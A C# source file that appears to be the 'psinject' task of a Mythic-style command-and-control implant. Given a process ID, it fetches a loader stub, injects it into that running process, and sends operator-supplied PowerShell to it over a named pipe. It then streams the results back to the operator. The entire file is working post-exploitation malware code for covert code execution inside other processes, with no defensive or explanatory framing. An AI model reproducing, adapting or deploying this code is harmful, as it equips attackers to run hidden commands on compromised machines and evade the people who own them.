#define COMMAND_NAME_UPPER

#if DEBUG
#define PSINJECT
#endif

#if PSINJECT

using System;
using System.Linq;
using System.Text;
using PhantomInterop.Classes;
using PhantomInterop.Interfaces;
using PhantomInterop.Structs.MythicStructs;
using System.Runtime.Serialization;
using PhantomInterop.Serializers;
using System.Threading;
using System.Collections.Concurrent;
using System.IO.Pipes;
using PhantomInterop.Structs.PhantomStructs;
using PhantomInterop.Classes.Collections;

namespace Tasks
{
    public class psinject : Tasking
    {
        [DataContract]
        internal struct PowerShellInjectParameters
        {
            [DataMember(Name = "pipe_name")]
            public string PipeName;
            [DataMember(Name = "loader_stub_id")]
            public string LoaderStubId;
            [DataMember(Name = "pid")]
            public int PID;
            [DataMember(Name = "powershell_params")]
            public string PowerShellParameters;
        }

        private AutoResetEvent _msgSendEvent = new AutoResetEvent(false);
        private ConcurrentQueue<byte[]> _msgSendQueue = new ConcurrentQueue<byte[]>();
        private JsonHandler _serializer = new JsonHandler();
        private AutoResetEvent _taskComplete = new AutoResetEvent(false);
        private Action<object> _transmitAction;

        private Action<object> _flushData;
        private ThreadSafeList<string> _assemblyOutput = new ThreadSafeList<string>();
        private bool _isFinished = false;
        public psinject(IAgent agent, MythicTask mythicTask) : base(agent, mythicTask)
        {
            _transmitAction = (object p) =>
            {
                PipeStream ps = (PipeStream)p;
                while (ps.IsConnected && !_stopToken.IsCancellationRequested)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                    _msgSendEvent,
                    _stopToken.Token.WaitHandle
                    });
                    if (!_stopToken.IsCancellationRequested && ps.IsConnected && _msgSendQueue.TryDequeue(out byte[] result))
                    {
                        ps.BeginWrite(result, 0, result.Length, ProcessSentMessage, p);
                    }
                }
                _taskComplete.Set();
            };

            _flushData = (object p) =>
            {
                string output = "";
                while (!_stopToken.IsCancellationRequested && !_isFinished)
                {
                    WaitHandle.WaitAny(new WaitHandle[]
                    {
                        _taskComplete,
                        _stopToken.Token.WaitHandle
                    }, 1000);
                    output = string.Join("", _assemblyOutput.Flush());
                    if (!string.IsNullOrEmpty(output))
                    {
                        _agent.GetTaskManager().AddTaskResponseToQueue(
                            CreateTaskResponse(
                                output,
                                false,
                                ""));
                    }
                }
                output = string.Join("", _assemblyOutput.Flush());
                if (!string.IsNullOrEmpty(output))
                {
                    _agent.GetTaskManager().AddTaskResponseToQueue(
                        CreateTaskResponse(
                            output,
                            false,
                            ""));
                }
            };
        }
        
        public override void Start()
        {
            MythicTaskResponse resp;
            try
            {
                PowerShellInjectParameters parameters = _dataSerializer.Deserialize<PowerShellInjectParameters>(_data.Parameters);
                if (string.IsNullOrEmpty(parameters.LoaderStubId) ||
                    string.IsNullOrEmpty(parameters.PowerShellParameters) ||
                    string.IsNullOrEmpty(parameters.PipeName))
                {
                    resp = CreateTaskResponse(
                        $"One or more required arguments was not provided.",
                        true,
                        "error");
                }
                else
                {
                    bool pidRunning = false;
                    try
                    {
                        System.Diagnostics.Process.GetProcessById(parameters.PID);
                        pidRunning = true;
                    }
                    catch
                    {
                        pidRunning = false;
                    }

                    if (pidRunning)
                    {
                        if (_agent.GetFileManager().GetFile(_stopToken.Token, _data.ID, parameters.LoaderStubId,
                                out byte[] exeAsmPic))
                        {
                            var injector = _agent.GetInjectionManager().CreateInstance(exeAsmPic, parameters.PID);
                            if (injector.Inject())
                            {
                                _agent.GetTaskManager().AddTaskResponseToQueue(CreateTaskResponse(
                                    "",
                                    false,
                                    "",
                                    new ICommandMessage[]
                                    {
                                        Artifact.ProcessInject(parameters.PID,
                                            _agent.GetInjectionManager().GetCurrentTechnique().Name)
                                    }));
                                string cmd = "";
                                string loadedScript = _agent.GetFileManager().GetScript();
                                if (!string.IsNullOrEmpty(loadedScript))
                                {
                                    cmd += loadedScript;
                                }

                                cmd += "\n\n" + parameters.PowerShellParameters;
                                IPCCommandArguments cmdargs = new IPCCommandArguments
                                {
                                    ByteData = new byte[0],
                                    StringData = cmd
                                };
                                AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", parameters.PipeName);
                                client.ConnectionEstablished += OnConnectionReady;
                                client.MessageReceived += Client_MessageReceived;
                                client.Disconnect += OnConnectionClosed;
                                if (client.Connect(3000))
                                {
                                    DataChunk[] chunks = _serializer.SerializeIPCMessage(cmdargs);
                                    foreach (DataChunk chunk in chunks)
                                    {
                                        _msgSendQueue.Enqueue(Encoding.UTF8.GetBytes(_serializer.Serialize(chunk)));
                                    }

                                    _msgSendEvent.Set();
                                    _taskComplete.WaitOne();
                                    _isFinished = true;
                                    resp = CreateTaskResponse("", true, "completed");
                                }
                                else
                                {
                                    resp = CreateTaskResponse($"Failed to connect to named pipe.", true, "error");
                                }
                            }
                            else
                            {
                                resp = CreateTaskResponse($"Failed to inject into PID {parameters.PID}", true, "error");
                            }
                        }
                        else
                        {
                            resp = CreateTaskResponse(
                                $"Failed to download assembly loader stub (with id: {parameters.LoaderStubId})",
                                true,
                                "error");
                        }
                    }
                    else
                    {
                        resp = CreateTaskResponse(
                            $"Process with ID {parameters.PID} is not running.",
                            true,
                            "error");
                    }
                }
            }
            catch (Exception ex)
            {
                resp = CreateTaskResponse($"Unexpected error: {ex.Message}\n\n{ex.StackTrace}", true, "error");
            }

            _agent.GetTaskManager().AddTaskResponseToQueue(resp);
        }

        private void OnConnectionClosed(object sender, PipeMessageData e)
        {
            e.Pipe.Close();
            _stopToken.Cancel();
            _taskComplete.Set();
        }

        private void OnConnectionReady(object sender, PipeMessageData e)
        {
            System.Threading.Tasks.Task.Factory.StartNew(_transmitAction, e.Pipe, _stopToken.Token);
            System.Threading.Tasks.Task.Factory.StartNew(_flushData, _stopToken.Token);
        }

        public void ProcessSentMessage(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result.AsyncState;
            
            if (pipe.IsConnected && !_stopToken.IsCancellationRequested && _msgSendQueue.TryDequeue(out byte[] data))
            {
                pipe.EndWrite(result);
                pipe.BeginWrite(data, 0, data.Length, ProcessSentMessage, pipe);
            }
        }

        private void Client_MessageReceived(object sender, PipeMessageData e)
        {
            IPCData d = e.Data;
            string msg = Encoding.UTF8.GetString(d.Data.Take(d.DataLength).ToArray());
            _assemblyOutput.Add(msg);
        }
    }
}
#endif